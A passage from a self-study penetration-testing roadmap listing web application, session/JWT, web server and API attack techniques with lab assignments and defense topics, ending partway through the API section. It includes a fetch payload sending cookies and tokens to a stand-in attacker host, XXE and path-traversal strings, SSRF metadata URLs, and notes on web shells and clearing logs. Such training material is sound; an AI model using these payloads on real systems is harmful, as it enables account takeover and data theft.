# Stage 3 — Web & App Sec

---

### 🧭 Navigation
◀ [Stage 2: Offense I](Stage-2_Offense-I.md) | 🏠 [Master Roadmap](README.md) | [Stage 4: Enterprise](Stage-4_Enterprise.md) ➔

---

> [!NOTE]
> **Stage Overview — Modules 14–18**
>
> - **⏱️ Estimated Time:** ~8–10 weeks of consistent daily sessions
> - **🎯 Modules:** `14`–`16` Web Application & Server Hacking · `17` API Security · `18` Bug Bounty Methodology
> - **🟡 Parallel (absorb only, never block):** Detection Awareness · IDS/Honeypots · OSINT/CTI
> - **🔴 Gate:** 3+ HTB/THM writeups · OWASP Top 10 hands-on · Linux+Windows privesc demonstrated cold — before moving to Stage 4
> - **🎯 Primary Focus:** Web application hacking, session hijacking & token attacks, web server exploitation, API security (OWASP API Top 10), and professional bug bounty methodology.

---

> [!NOTE]
> ### 📝 Stage 3 Documentation Requirements
> Every vulnerability you discover must be documented to professional reporting standards. Required artifacts:
> - **Bug reports** in standard format (title, severity, description, steps to reproduce, impact, remediation)
> - **Burp request/response pairs** — saved HTTP interactions proving each vulnerability
> - **PortSwigger lab solutions** — writeups for each completed lab explaining the vulnerability class
> - **PoC screenshots and videos** — visual evidence for every finding
> - **Git commits** — all reports and evidence committed to your repository
>
> _By the end of Phase 4, you should have a library of vulnerability reports ready for your portfolio._

> [!IMPORTANT]
> ### 🛠️ Mandatory Tool Stack (Must Master in This Phase)
>
> | Priority | Tool | Purpose & Core Skills |
> | :--- | :--- | :--- |
> | **Tier 1 (Mandatory)** | [Burp Suite](file:///home/smilo/Desktop/MY_FOLDER/Cyber-Security/Roadmap/Tools/Burp_Suite.md) (Community or Pro) | HTTP/S proxying, Repeater parameter manipulation, Intruder fuzzing, match & replace rules, Autorize plugin (IDOR). |
> | **Tier 1 (Mandatory)** | [ffuf](file:///home/smilo/Desktop/MY_FOLDER/Cyber-Security/Roadmap/Tools/ffuf.md) / [Gobuster](file:///home/smilo/Desktop/MY_FOLDER/Cyber-Security/Roadmap/Tools/Gobuster.md) | High-speed web content/directory discovery, virtual host routing fuzzing, parameter fuzzing. |
> | **Tier 1 (Mandatory)** | [sqlmap](file:///home/smilo/Desktop/MY_FOLDER/Cyber-Security/Roadmap/Tools/sqlmap.md) | Automated SQL injection testing, tamper script crafting, DBMS fingerprinting, database dumping. |
> | **Tier 1 (Mandatory)** | [Postman](file:///home/smilo/Desktop/MY_FOLDER/Cyber-Security/Roadmap/Tools/Postman.md) / cURL | REST/GraphQL API schema testing, authentication token injection, automated regression request suites. |
> | **Tier 1 (Mandatory)** | [jwt-tool](file:///home/smilo/Desktop/MY_FOLDER/Cyber-Security/Roadmap/Tools/jwt-tool.md) | JSON Web Token tampering, algorithm confusion (`none`), key cracking, signature forgery. |
> | **Tier 2 (Secondary)** | [Nuclei](file:///home/smilo/Desktop/MY_FOLDER/Cyber-Security/Roadmap/Tools/Nuclei.md) | Template-based vulnerability scanning, custom YAML template writing for known CVEs. |
> | **Tier 2 (Secondary)** | [OWASP ZAP](file:///home/smilo/Desktop/MY_FOLDER/Cyber-Security/Roadmap/Tools/OWASP_ZAP.md) | Open-source proxy alternative, automated spidering, baseline CI/CD security scanning. |
> | **Tier 2 (Secondary)** | [wpscan](file:///home/smilo/Desktop/MY_FOLDER/Cyber-Security/Roadmap/Tools/wpscan.md) & [Nikto](file:///home/smilo/Desktop/MY_FOLDER/Cyber-Security/Roadmap/Tools/Nikto.md) | CMS-specific auditing (WordPress themes/plugins) and legacy web server configuration profiling. |
>
> **Stage 3 Exit Gate:** You cannot pass Stage 3 until you can intercept web traffic in Burp Suite, uncover an unlinked API route using `ffuf`, forge an admin session using `jwt-tool`, and extract database schema details using `sqlmap` with an appropriate tamper script.

---

### 🗂️ Table of Contents
- [Part 17: Web Application Hacking](#part-17-web-application-hacking)
  - [Topic 1: Reconnaissance & Mapping](#stage-1-reconnaissance-mapping)
  - [Topic 2: Vulnerability Analysis & Probing](#stage-2-vulnerability-analysis-probing)
  - [Topic 3: Exploitation (The OWASP Top 10)](#stage-3-exploitation-the-owasp-top-10)
  - [Topic 4: Post-Exploitation & Persistence](#stage-4-post-exploitation-persistence)
  - [Topic 5: Defense & Mitigation (The Shield)](#stage-5-defense-mitigation-the-shield)
  - [Lab Progression (Part 17: Web Application Hacking)](#lab-progression-part-17-web-application-hacking)
- [Part 12: Session Hijacking & Token Attacks](#part-12-session-hijacking-token-attacks)
  - [Topic 1: Session Architecture & Vulnerability Analysis](#stage-1-session-architecture-vulnerability-analysis)
  - [Topic 2: Token Theft & Interception Vectors](#stage-2-token-theft-interception-vectors)
  - [Topic 3: Token Forgery & Replay](#stage-3-token-forgery-replay)
- [Part 18: Web Server Hacking](#part-18-web-server-hacking)
  - [Topic 1: Target Acquisition & Reconnaissance](#stage-1-target-acquisition-reconnaissance)
  - [Topic 2: Scanning & Service Enumeration](#stage-2-scanning-service-enumeration)
  - [Topic 3: Vulnerability Assessment & Exploitation](#stage-3-vulnerability-assessment-exploitation)
  - [Topic 4: Post-Exploitation & Persistence](#stage-4-post-exploitation-persistence)
  - [Lab Progression (Part 18: Web Server Hacking)](#lab-progression-part-18-web-server-hacking)
- [Part 19: API Security](#part-19-api-security)
  - [Topic 1: API Reconnaissance & Mapping](#stage-1-api-reconnaissance-mapping)
  - [Topic 2: OWASP API Security Top 10](#stage-2-owasp-api-security-top-10)
  - [Topic 3: Protocol-Specific API Attacks](#stage-3-protocol-specific-api-attacks)
  - [Topic 4: API Authentication & Token Attacks](#stage-4-api-authentication-token-attacks)
  - [Topic 5: Defense & Hardening](#stage-5-defense-hardening)
  - [Lab Progression (Part 19: API Security)](#lab-progression-part-19-api-security)
- [Part 20: Bug Bounty and Penetration Testing](#part-20-bug-bounty-and-penetration-testing)
  - [Topic 1: Preparation & Scoping](#stage-1-preparation-scoping)
  - [Topic 2: Reconnaissance (The Wide Net)](#stage-2-reconnaissance-the-wide-net)
  - [Topic 3: Vulnerability Assessment (The Deep Dive)](#stage-3-vulnerability-assessment-the-deep-dive)
  - [Topic 4: Exploitation & Validation](#stage-4-exploitation-validation)
  - [Topic 5: Reporting & Triage](#stage-5-reporting-triage)
  - [Topic 6: Professional Development](#stage-6-professional-development)

---

<a id="part-17-web-application-hacking"></a>


---

<a id="module-14-web-application-hacking"></a>
<a id="part-17-web-application-hacking"></a>

## Module 14: Web Application Hacking


> [!NOTE]
> **📚 Recommended Books for This Part**
> - 🔴 `The Web Application Hacker's Handbook` — Primary companion — read the chapter matching your current PortSwigger module
> - 🔴 `SQL Injection Attacks and Defense` — Deepest SQLi reference; read alongside PortSwigger SQLi Modules 6–18
> - 🔴 `Burp Suite Compendium` / `The Power of Burp Suite` — Reference — deep Burp feature coverage
> - 🟡 `Web Application Security - Andrew Hoffman` — Full — developer-code-level explanation of WHY each vulnerability exists
> - 🟡 `Web penetration testing with kali linux` — Targeted chapters — Burp, sqlmap, Nikto, ZAP in practice
> - 🟡 `Bypassing Web Application Firewall Workshop` — Full — WAF bypass techniques for filter evasion labs
> - 🟡 `XSS CheatSheet` — Keep open during all PortSwigger XSS modules
> - 🟢 `White Hat Hacking complete guide to XSS Attacks` — Full (short) — structured XSS coverage
> - 🟢 `SQL Injection Attacks` / `SQL Injection Strategies` / `SQL injection CyberSecurity` — Quick reference PDFs
> - 🟢 `Web Application Hacking Advanced SQL Injection and Data Store Attacks` — Advanced DB-level exploitation post-PortSwigger SQLi


> [!IMPORTANT]
> **Phase 4 Resource Alignment**
>
> | Resource | Role |
> |----------|------|
> | **This roadmap (Phase 4)** | Curriculum — what to learn and in what order |
> | **PortSwigger Web Security Academy** | Primary lab environment — do labs that match the current topic |
> | **Burp Suite** | Primary tool for all web testing work |
> | **OWASP Juice Shop / DVWA** | Secondary lab environments for free-form practice |
> | **Web pentesting books/courses** | Reference only — use for a second explanation, not as a competing roadmap |

> [!NOTE]
> **Part 17 Vulnerability Learning Sequence** — work through topics in this order within Stage 3:
>
> ```text
> HTTP/Web fundamentals (already in Phase 1 Part 3C — review if needed)
>         ↓
> Recon & attack-surface mapping → Burp Suite setup
>         ↓
> Content discovery (directories, endpoints, backup files)
>         ↓
> Authentication attacks (broken auth, credential stuffing, password reset flaws)
>         ↓
> Authorization & IDOR (access control bypass, object reference manipulation)
>         ↓
> XSS — Reflected → Stored → DOM-based
>         ↓
> SQL Injection — Error-based → Boolean blind → Time-based blind
>         ↓
> CSRF
>         ↓
> SSRF
>         ↓
> Command Injection
>         ↓
> Path Traversal / LFI / RFI
>         ↓
> XXE (XML External Entity)
>         ↓
> SSTI (Server-Side Template Injection)
>         ↓
> File Upload vulnerabilities
>         ↓
> Business logic flaws
>         ↓
> Web cache poisoning / advanced web attacks
> ```
>
> PortSwigger has labs for every one of these. Do the labs as you reach each topic — not all upfront.


<a id="stage-1-reconnaissance-mapping"></a>
### **Topic 1: Reconnaissance & Mapping** — `🔬 Practical`

> [!TIP]
> **Goal:** Understand the target application's structure and technologies.

- [ ] **OSINT & Discovery:** Perform **Reconnaissance** using **Google Dorks, Shodan, Certificate Transparency** to find subdomains, exposed admin panels, and developer info.

- [ ] **Service Enumeration:** Use `[nmap](Tools/Nmap.md) -sV -sC` to identify web servers, versions, and common vulnerabilities.

- [ ] **Technology Fingerprinting:** Use **Wappalyzer, BuiltWith, WhatWeb** to identify frameworks, CMS, WAF, CDN, and backend technologies.

- [ ] **Content Discovery:** Run **[Gobuster](Tools/Gobuster.md), [ffuf](Tools/ffuf.md), dirsearch** to find hidden directories, backup files, API endpoints, and admin panels.

- [ ] **Sitemap & Robots Analysis:** Parse **robots.txt, sitemap.xml, security.txt** for disallowed paths and contact info.

---

<a id="stage-2-vulnerability-analysis-probing"></a>
### **Topic 2: Vulnerability Analysis & Probing** — `🔬 Practical`

> [!TIP]
> **Goal:** Find potential entry points and weaknesses.

- [ ] **Input Validation Testing:** Test every input field for **SQL Injection, NoSQL Injection, Command Injection, LDAP Injection**.

- [ ] **Path Manipulation:** Probe for **Directory/Path Traversal** using `../../../etc/passwd` and **LFI/RFI** vulnerabilities.

- [ ] **Logic Testing:** Analyze **authentication/authorization** mechanisms; test for **IDOR, broken access controls, privilege escalation**.

- [ ] **Protocol & Crypto Analysis:** Check **TLS configuration** with **sslyze/testssl.sh**; test for **weak ciphers, certificate issues, HTTPS downgrade**.

- [ ] **API Testing:** Enumerate **REST/GraphQL/SOAP** endpoints; test for **lack of rate limiting, exposed documentation, mass assignment**.

---

<a id="stage-3-exploitation-the-owasp-top-10"></a>
### **Topic 3: Exploitation (The OWASP Top 10 & Modern Web Attacks)** — `🔬 Practical`

> [!TIP]
> **Goal:** Prove the vulnerability, chain attack primitives, and achieve demonstrable impact.

- [ ] **Injection Attacks:** Execute **SQL injection** (Union-based, Error-based, Blind Boolean/Time-based, Out-of-band); **OS command injection** for remote shells; **LDAP & XPath** injection.

- [ ] **Cross-Site Scripting (XSS):** Deliver **reflected, stored, and DOM-based** XSS. Bypass CSP filters, weaponize payloads to steal session tokens, execute keyloggers, and trigger client-side actions.

- [ ] **Server-Side Request Forgery (SSRF) & Cloud Metadata Extraction:**
  - Leverage SSRF to reach internal loopback services (`127.0.0.1`) and cloud metadata endpoints (`http://169.254.169.254/latest/meta-data/`).
  - Extract temporary cloud credentials via instance profile role paths (`.../iam/security-credentials/<role>`).
  - Bypass IP filters: alternate IP encoding (hex, dword, octal), DNS rebinding, IPv6 `[::]`, and URL parser discrepancies.
  - Understand **AWS IMDSv2 defense**: requires session token via `PUT` with `X-aws-ec2-metadata-token-ttl-seconds: 21600` header — why IMDSv2 defeats simple GET-based SSRF.

- [ ] **Race Conditions & Concurrency Exploitation:**
  - Exploit multi-threaded race windows using PortSwigger's **Turbo Intruder** (Single-Packet Attack over HTTP/2).
  - Test for: limit-overrun attacks (redeeming discount vouchers multiple times), multi-endpoint race conditions (purchasing items without deducting balance), and race-driven password resets.

- [ ] **HTTP Request Smuggling & Protocol Desync:**
  - Exploit inconsistencies between front-end reverse proxies and back-end servers parsing `Content-Length` vs `Transfer-Encoding` (`CL.TE`, `TE.CL`, `TE.TE`).
  - Smuggle secondary HTTP requests into next client connections; hijack user sessions, bypass WAF rewrite rules, and poison web caches.

- [ ] **CSRF & Request Forgery:** Construct **CSRF PoCs** to perform unauthorized state-changing actions; bypass weak Referer / Origin header checks and `SameSite` lax transitions.

- [ ] **Authentication & JWT Attacks:** Exploit **logic flaws, password reset flows**, **JWT signature stripping (`none` algorithm), HMAC key confusion with public RSA keys, and weak secret brute-forcing**.

- [ ] **File Upload Exploitation:** Bypass **content-type, magic bytes, and extension filters** to upload web shells via **null bytes, double extensions, path traversal, and polyglot files**.

- [ ] **Insecure Deserialization & Template Injection (SSTI):** Exploit **unsafe deserialization** (Python `pickle`, Java `ysoserial`, PHP `unserialize`); identify SSTI in **Jinja2, Twig, Freemarker** to escape sandbox and gain RCE.

- [ ] **XML External Entity (XXE):** Parse **malicious XML doctypes** with external entities (`<!ENTITY xxe SYSTEM "file:///etc/passwd">`) for local file disclosure, SSRF, and blind out-of-band exfiltration.

- [ ] **WebSockets & Real-Time Protocol Security:**
  - Test for **Cross-Site WebSocket Hijacking (CSWSH)** due to missing CSRF token validation or unvalidated `Origin` headers on WebSocket upgrade handshakes (`GET /ws HTTP/1.1 Upgrade: websocket`).
  - Intercept, modify, and fuzz bidirectional WebSocket messages using Burp Suite WebSocket history and repeater.
  - Assess rate limiting, schema validation, and authorization controls applied to asynchronous frames versus REST endpoints.

---

<a id="stage-4-post-exploitation-persistence"></a>
### **Topic 4: Post-Exploitation & Persistence** — `🔬 Practical`

> [!TIP]
> **Goal:** Maintain access and pivot deeper.

- [ ] **Web Shell Management:** Deploy **persistent web shells** (PHP, ASPX, JSP) in writable directories.

- [ ] **Database Enumeration:** Extract **credentials, PII, business data** via SQL injection or direct access.

- [ ] **Lateral Movement:** Use compromised web app to **pivot to internal network, access cloud metadata (IMDS), enumerate AWS/Azure resources**.

- [ ] **Data Exfiltration:** Exfil via **DNS, HTTPS covert channels, cloud storage APIs**.

---

<a id="stage-5-defense-mitigation-the-shield"></a>
### **Topic 5: Defense & Mitigation (The Shield)** — `🧠 Conceptual`

> [!TIP]
> **Goal:** Prevent and detect these attacks.

- [ ] **WAF Deployment:** Implement **Web Application Firewall** (ModSecurity, CloudFlare WAF, AWS WAF) with custom rules.

- [ ] **Secure Coding:** Use **parameterized queries, input validation, output encoding, CSP headers** to prevent injections.

- [ ] **Strong Authentication:** Require **MFA/2FA, strong password policies, account lockout, CAPTCHA** after failed attempts.

- [ ] **Security Headers:** Implement **CSP, X-Frame-Options, HSTS, X-Content-Type-Options** to mitigate client-side attacks.

- [ ] **Continuous Monitoring:** Deploy **SIEM, web server logging, intrusion detection** to identify attack patterns.

---

<a id="lab-progression-part-17-web-application-hacking"></a>
### **Lab Progression (Part 17: Web Application Hacking)**

| Level | Task | Deliverable |
|-------|------|-------------|
| 1 | Complete all OWASP Top 10 labs on PortSwigger Web Security Academy | Badge/completion screenshots |
| 2 | Exploit SQLi + XSS + SSRF on DVWA or OWASP Juice Shop | Attack chain documentation with request/response evidence |
| 3 | Perform an authenticated web app assessment on WebGoat (all modules) | Structured vulnerability report |
| 4 | Chain 3+ vulnerabilities for maximum impact on a single lab target (e.g., XSS→session theft→admin access→RCE) | Kill chain diagram + technical report |
| 5 | Write a custom [Burp Suite](Tools/Burp_Suite.md) extension or automated scanner script | Working extension/script + README |
| 6 | Complete 10 PentesterLab exercises (source-code-level web vulnerability analysis) | Exercise certificates + code review notes |
| 7 | Solve 5 Root-Me web application challenges at intermediate difficulty | Challenge completion screenshots + methodology notes |

**Platform Guide for Phase 4:**

| Platform | Best For | Cost |
|----------|----------|------|
| [PortSwigger Web Security Academy](https://portswigger.net/web-security) | OWASP Top 10 labs, JWT attacks, SSRF, OAuth, deserialization — industry gold standard | Free |
| [PentesterLab](https://pentesterlab.com) | Source-code-based vulnerability training, PHP/Ruby/Python code review, white-box web testing | Free + Pro |
| [Root-Me](https://root-me.org) | 400+ realistic web challenges organized by category and difficulty — excellent for breadth coverage | Free |
| [DVWA / OWASP Juice Shop / WebGoat](https://owasp.org) | Self-hosted intentionally vulnerable apps for manual exploitation practice | Free (self-hosted) |
| [Hack The Box](https://hackthebox.com) | Web-focused machines + Pro Lab environments for realistic enterprise web app testing | Free + VIP |
| [TryHackMe](https://tryhackme.com) | Guided web hacking learning paths — good for structured beginners before PortSwigger | Free + Premium |

> [!IMPORTANT]
> **Move-On Gate:** You can perform a complete web application assessment covering OWASP Top 10, chain vulnerabilities for maximum impact, use Burp Suite professionally, and produce a client-ready web app pentest report.

---

<a id="toc-part-12-session-hijacking-token-attacks"></a>
<a id="part-12-session-hijacking-token-attacks"></a>

---

<a id="module-15-session-hijacking--token-attacks"></a>
<a id="part-12-session-hijacking"></a>

## Module 15: Session Hijacking & Token Attacks


> [!NOTE]
> **📚 Recommended Books for This Part**
> - 🔴 `The Tangled Web` — Chapters on browser security models, cookies, origin boundaries, and session lifecycles
> - 🟡 `The Web Application Hacker's Handbook (WAHH)` — Chapter 7: Attacking Session Management
> - 🟢 `Real-World Bug Hunting` — Case studies on token leakage, OAuth account takeovers, and session fixation

> [!IMPORTANT]
> **Architectural Placement Note:** While legacy syllabi treat Session Hijacking as a generic network-sniffing concept, in modern networks (TLS ubiquitous, HSTS enforced) session attacks are almost exclusively application-layer exploits. This module directly builds on **Part 17: Web Application Hacking** (XSS, CSRF, Auth flaws) and prepares you for **Part 19: API Security** (OAuth2/OIDC token flows).

---

<a id="stage-1-session-architecture-vulnerability-analysis"></a>
### **Topic 1: Session Architecture & Vulnerability Analysis** — `🔬 Practical`

> [!TIP]
> **Goal:** Deconstruct session state mechanisms, evaluate token entropy, and analyze browser security boundaries.

- [ ] **Stateful vs Stateless Sessions:**
  - **Stateful (Server-Side):** Database/Redis-backed sessions indexed by an opaque session ID (`PHPSESSID`, `JSESSIONID`, `ASP.NET_SessionId`).
  - **Stateless (Client-Side):** Signed or encrypted tokens (JWT, Fernet, PASETO) where state lives in the client token and the server verifies signature validity.
  - **Storage Analysis:** Inspect token residency in `Document.cookie`, `localStorage`, `sessionStorage`, or `IndexedDB`. Recognize that web storage (`localStorage`) is unconditionally readable by ANY XSS payload, bypassing `HttpOnly`.

- [ ] **Cookie Attribute Security Profiling:**
  - **`HttpOnly`:** Blocks JavaScript `document.cookie` access (mitigating basic XSS token exfiltration).
  - **`Secure`:** Enforces transmission only over TLS (prevents cleartext sniffing).
  - **`SameSite`:**
    - `Strict`: Never sent in cross-site requests (highest CSRF protection).
    - `Lax`: Sent on top-level safe GET navigations (default in modern Chrome/Firefox).
    - `None`: Sent across all third-party contexts (requires `Secure` attribute).
  - **`Domain` & `Path` Scope:** Evaluate overly broad domain scoping (`domain=.target.com`) permitting subdomain cookie injection (cookie tossing).

- [ ] **Token Entropy & Predictability:**
  - Capture sequences of session tokens using Burp Suite **Sequencer**.
  - Analyze FIPS 140-2 randomness, Shannon entropy, and bit-level predictability to detect pseudo-random generation algorithms (PRNG seeding flaws).

---

<a id="stage-2-token-theft-interception-vectors"></a>
### **Topic 2: Token Theft & Interception Vectors** — `🔬 Practical`

> [!TIP]
> **Goal:** Execute client-side and protocol-level attack chains to extract live authentication tokens.

- [ ] **XSS-Based Token Exfiltration:**
  - Craft asynchronous fetch payloads to transmit stolen cookies or web storage tokens to an attacker-controlled endpoint:
    ```javascript
    fetch('https://attacker-collaborator.net/log?c=' + encodeURIComponent(document.cookie));
    fetch('https://attacker-collaborator.net/log?token=' + encodeURIComponent(localStorage.getItem('access_token')));
    ```
  - Bypass CSP restrictions (script-src, connect-src) via DNS prefetch exfiltration, dangling markup injection, or CSP bypass gadgets.

- [ ] **Session Fixation:**
  - Identify applications that maintain the pre-authentication session ID upon successful user login.
  - Force a predetermined session token onto the victim via URL query parameter (`https://app.com/?session_id=attacker_token`) or subdomain Set-Cookie injection (`Set-Cookie: session_id=attacker_token; Domain=.company.com`).
  - Once the victim authenticates using that session, take over the authenticated session using the known ID.

- [ ] **CORS Misconfiguration Token Leaks:**
  - Detect `Access-Control-Allow-Origin: *` or dynamically reflected origins paired with `Access-Control-Allow-Credentials: true`.
  - Host an exploit page that issues authenticated requests and reads private session data or anti-CSRF tokens from the response body.

- [ ] **Network-Level Interception (Legacy/Fallback Contexts):**
  - In internal network assessments where TLS is missing or unpinned: ARP spoofing ([Bettercap](Tools/Bettercap.md)), DNS spoofing, and SSL stripping ([Bettercap](Tools/Bettercap.md) / [Burp Suite](Tools/Burp_Suite.md)) to harvest cleartext session headers.

---

<a id="stage-3-token-forgery-replay"></a>
### **Topic 3: Token Forgery & Replay** — `🔬 Practical`

> [!TIP]
> **Goal:** Exploit stateless token architectures (JWT/OAuth) to forge administrative identities and replay stolen credentials.

- [ ] **JSON Web Token (JWT) Exploitation ([jwt-tool](Tools/jwt-tool.md)):**
  - **Algorithm Confusion (`alg: none`):** Strip or alter the signature header to `none` / `None` / `NONE` to test if the backend accepts unsigned payloads.
  - **Key Confusion (RS256 ➔ HS256):** When a server uses asymmetric RS256, change the algorithm to symmetric HS256 and sign the token using the server's public key as the HMAC secret key.
  - **Weak HMAC Secret Cracking:** Extract the signature and crack the secret offline using `hashcat -m 16500 jwt.txt rockyou.txt` or `jwt-tool -C -d dictionary.txt`.
  - **JWK / JKU Header Injection:** Inject an attacker-controlled public key directly in the `jwk` header parameter or point the `jku` (JWK Set URL) parameter to an attacker server hosting a malicious JWKS file.

- [ ] **OAuth 2.0 & OIDC Token Hijacking:**
  - Exploit unvalidated `redirect_uri` parameters in the authorization code flow to leak authorization codes or implicit access tokens to an external host.
  - Flawed state parameter implementation leading to CSRF-based account linking.
  - Refresh token replay: Test if refresh tokens remain valid indefinitely without rotation or expiration upon password resets.

---

<a id="stage-4-defense-mitigation-the-shield"></a>
### **Topic 4: Defense & Mitigation (The Shield)** — `🧠 Conceptual`

> [!TIP]
> **Goal:** Architect resilient session handling mechanisms resilient against client and network interception.

- [ ] **Cryptographic Hygiene & Token Invalidation:**
  - Issue cryptographically secure pseudo-random tokens (minimum 128 bits of entropy).
  - Enforce complete session destruction on both client and server upon logout or timeout.
  - Mandatory session regeneration: Generate a completely new session identifier immediately following any privilege transition or successful login.

- [ ] **Hardened Cookie Flags:**
  - Enforce `__Host-` or `__Secure-` cookie prefixes to prevent subdomain shadowing and cookie tossing.
  - Strictly configure `HttpOnly; Secure; SameSite=Lax` (or `Strict` where practical).

- [ ] **Modern Cryptographic Token Binding:**
  - Implement **DPoP (Demonstrating Proof-of-Possession at the Application Layer - RFC 9449)** or **mTLS Token Binding** so stolen access tokens cannot be replayed from unauthorized client endpoints.
  - Enforce strict single-use Refresh Token Rotation (RTR) with reuse detection (invalidating all tokens in the family if an old refresh token is reused).

---

<a id="lab-progression-part-12-session-hijacking"></a>
### **Lab Progression (Part 12: Session Hijacking & Token Attacks)**

| Level | Task | Deliverable |
|-------|------|-------------|
| 1 | Inspect cookie flags and entropy on a live web application using Burp Sequencer | Session randomness and security attribute audit report |
| 2 | Execute a session fixation attack against a deliberately vulnerable web lab | Proof-of-concept showing authenticated state takeover via fixed session token |
| 3 | Exploit Stored XSS to exfiltrate active session tokens to Burp Collaborator / webhook | Exploit payload + captured session token + authenticated impersonation evidence |
| 4 | Attack JSON Web Tokens: perform `alg: none` bypass, RS256-to-HS256 key confusion, and crack a weak secret with Hashcat | Complete JWT exploitation report with modified token payloads |
| 5 | Intercept and exploit a flawed OAuth2 implementation (leaking authorization codes via open redirect) | End-to-end OAuth account takeover writeup |

> [!IMPORTANT]
> **Move-On Gate:** You can systematically assess session management mechanisms, identify and exploit session fixation, steal tokens via XSS/CORS flaws, execute JWT signature and algorithm bypasses using `jwt-tool`, and design hardened, token-bound defense architectures.

---

<a id="toc-part-18-web-server-hacking"></a>
<a id="part-18-web-server-hacking"></a>

---

<a id="module-16-web-server-hacking"></a>
<a id="part-18-web-server-hacking"></a>

## Module 16: Web Server Hacking


> [!NOTE]
> **📚 Recommended Books for This Part**
> - 🟡 `Web Application Attacks` — Broad web attack catalog — covers server-side attack vectors beyond SQLi and XSS
> - 🟢 `Web security exposed` — Reference — supplementary web server attack coverage
> - 🟢 `WordPress Hacking and Security` — Reference — CMS-specific attack methodology for real-world scope targets


<a id="stage-1-target-acquisition-reconnaissance"></a>
### **Topic 1: Target Acquisition & Reconnaissance** — `🔬 Practical`

> [!TIP]
> **Goal:** Identify the target server and gather intelligence.

- [ ] **OSINT Gathering:** Conduct **Reconnaissance** using **WHOIS, DNS enumeration, Certificate Transparency** to identify IP ranges and domain information.

- [ ] **Network Mapping:** Determine the server's network position via **traceroute, OSINT**; identify if it's in **Perimeter, DMZ, or internal** segments.

- [ ] **Historical Analysis:** Use **Wayback Machine, Shodan history** to identify previous exposures and configuration changes.

---

<a id="stage-2-scanning-service-enumeration"></a>
### **Topic 2: Scanning & Service Enumeration** — `🔬 Practical`

> [!TIP]
> **Goal:** Map out the server's attack surface.

- [ ] **Port Scanning:** Use `nmap -sS -sV -sC -p-` to discover **all open ports** and identify services (Apache, Nginx, IIS, Tomcat, SSH, FTP, DB).

- [ ] **Banner Grabbing:** Use **curl, nc, telnet** to grab service banners and identify **software versions, OS fingerprints**.

- [ ] **HTTP Method Enumeration:** Test for **PUT, DELETE, TRACE, OPTIONS** enabled; check **WebDAV** misconfiguration.

- [ ] **Protocol Audit:** Check for **insecure protocols (HTTP, FTP, Telnet)**; analyze **TLS** config with **testssl.sh** for weak ciphers.

- [ ] **Virtual Host Discovery:** Enumerate **vhosts** via **Host header manipulation, DNS brute-forcing** to find hidden services.

---

<a id="stage-3-vulnerability-assessment-exploitation"></a>
### **Topic 3: Vulnerability Assessment & Exploitation** — `🔬 Practical`

> [!TIP]
> **Goal:** Find and exploit flaws to gain initial access.

- [ ] **Patch Audit:** Check for **outdated software versions** against CVE databases; test for **known exploits** (Apache Struts, IIS 6.0, etc.).

- [ ] **Web Application Attacks:** Attempt **SQL injection, XSS, file upload** against hosted applications to compromise the web server.

- [ ] **File System Attacks:** Test for **directory traversal** (`../../../etc/passwd`), **LFI/RFI**, **arbitrary file read**.

- [ ] **Service Exploitation:** Look for **buffer overflow, format string, RCE** exploits for specific service versions (Apache mod_ssl, ProFTPd, vsftpd).

- [ ] **Credential Attacks:** Launch **brute force, password spray, dictionary attacks** against **SSH, FTP, admin panels** with [Hydra](Tools/Hydra.md)/Medusa.

- [ ] **Default Credentials:** Test **default admin passwords** for web servers (tomcat/tomcat, admin/admin) and management interfaces.

---

<a id="stage-4-post-exploitation-persistence"></a>
### **Topic 4: Post-Exploitation & Persistence** — `🔬 Practical`

> [!TIP]
> **Goal:** Escalate privileges and maintain control.

- [ ] **Privilege Escalation:** After gaining low-privilege shell, use **kernel exploits, SUID binaries, sudo misconfigs, service misconfigurations** for root/SYSTEM.

- [ ] **Web Shell Deployment:** Upload **persistent web shells** (b374k, c99, webacoo) to writable web directories for backdoor access.

- [ ] **Living off the Land:** Use **LOLBAS/GTFOBins** for post-exploitation execution and persistence. 📌 _See Part 7 Stage 2 for full LOLBAS/GTFOBins coverage._

- [ ] **Credential Harvesting:** Dump **database credentials, config files** (`web.config`, `wp-config.php`), **SSH keys** for lateral movement.

- [ ] **Covering Tracks:** Clear **access logs, error logs, auth logs**; use **timestomping** to hide file modifications.

---

<a id="lab-progression-part-18-web-server-hacking"></a>
### **Lab Progression (Part 18: Web Server Hacking)**

| Level | Task | Deliverable |
|-------|------|-------------|
| 1 | Enumerate and exploit a vulnerable web server (Metasploitable 2/3) | Exploitation walkthrough |
| 2 | Gain shell via file upload or RCE on a lab web server | Web shell deployment report |
| 3 | Escalate from web shell to root/SYSTEM on the host | Full attack chain document |
| 4 | Exploit a misconfigured web server (default creds, PUT method, WebDAV) | Misconfiguration exploitation report |
| 5 | Harden a web server against all attacks you performed | Hardening checklist + before/after comparison |

> [!IMPORTANT]
> **Move-On Gate:** You can identify web server technologies, exploit known service vulnerabilities, escalate privileges from web shell to root/SYSTEM, and produce hardening recommendations based on your findings.

---

<a id="toc-part-19-api-security"></a>
<a id="part-19-api-security"></a>

---

<a id="module-17-api-security"></a>
<a id="part-19-api-security"></a>

## Module 17: API Security


> [!NOTE]
> **📚 Recommended Books for This Part**
> - 🔴 `Hacking APIs Breaking Web Application Programming Interfaces - Corey` — Full book — the best dedicated API security resource; maps directly to this Part
> - 🟡 `Web security testing guide` — Reference — OWASP WSTG API test cases; use IDs when writing reports


<a id="stage-1-api-reconnaissance-mapping"></a>
### **Topic 1: API Reconnaissance & Mapping** — `🔬 Practical`

> [!TIP]
> **Goal:** Discover and map API attack surface.

- [ ] **API Discovery:** Find undocumented endpoints via **JS file analysis, Wayback Machine, Google Dorks (`site:target.com api`), Shodan**, and **Burp Suite passive crawling**.

- [ ] **Spec File Harvesting:** Locate exposed **OpenAPI/Swagger (`/swagger.json`, `/api-docs`), WSDL, GraphQL introspection** schemas that reveal all routes, parameters, and data models.

- [ ] **Endpoint Enumeration:** Fuzz **API paths and versions** (`/api/v1/`, `/api/v2/`, `/v3/`) using **ffuf, kiterunner, Arjun** with API-specific wordlists.

- [ ] **Technology Fingerprinting:** Identify **framework, auth scheme, rate limiting, versioning strategy** from headers, response patterns, and error messages.

---

<a id="stage-2-owasp-api-security-top-10"></a>
### **Topic 2: OWASP API Security Top 10** — `🧠🔬 Mixed`

> [!TIP]
> **Goal:** Methodically test each API-specific vulnerability class.

- [ ] **API1 — Broken Object Level Authorization (BOLA/IDOR):** Substitute **object IDs** (user, order, account) in requests to access **other users' resources** without authorization check.

- [ ] **API2 — Broken Authentication:** Test **weak tokens, missing expiry, no rate limiting on login, JWT algorithm confusion (`alg:none`), token reuse after logout**.

